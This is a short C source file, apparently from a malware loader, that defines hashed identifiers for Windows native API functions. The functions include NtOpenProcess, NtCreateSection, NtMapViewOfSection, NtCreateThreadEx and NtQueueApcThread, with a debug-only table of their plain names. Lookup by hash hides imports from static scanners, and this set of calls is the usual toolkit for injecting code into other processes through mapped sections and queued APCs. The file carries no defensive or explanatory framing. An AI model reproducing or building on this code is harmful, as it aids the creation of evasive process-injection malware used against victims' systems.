/*
 * Change apisets.h and this file for API changes
 *
 */

#include "apisets.h"

// Append API to MAL_NT_API_TBL in apisets.c
// Append API to mal_nt_hash_arr
// Append API to mal_nt_name_arr
// !!! NOTE THAT ORDER MUST MATCH !!!
const DWORD mal_nt_hash_arr[] = {
    0x837FAFFE,     // NtOpenProcess
    0x71D40BAA,     // NtQueryInformationProcess
    0x192C02CE,     // NtCreateSection
    0x91436663,     // NtMapViewOfSection
    0x0A5B9402,     // NtUnmapViewOfSection
    0x8EC0B84A,     // NtCreateThreadEx
    0xEB15EA8A,     // NtQueueApcThread
    0x91527655,     // NtAlertResumeThread
    0xB947891A,     // NtDelayExecution
    0x6299AD3D,     // NtWaitForSingleObject
    0x369BD981      // NtClose
};

#ifdef _DEBUG

const PCHAR mal_nt_name_arr[] = {
    "NtOpenProcess",
    "NtQueryInformationProcess",
    "NtCreateSection",
    "NtMapViewOfSection",
    "NtUnmapViewOfSection",
    "NtCreateThreadEx",
    "NtQueueApcThread",
    "NtAlertResumeThread",
    "NtDelayExecution",
    "NtWaitForSingleObject",
    "NtClose"
};

#endif

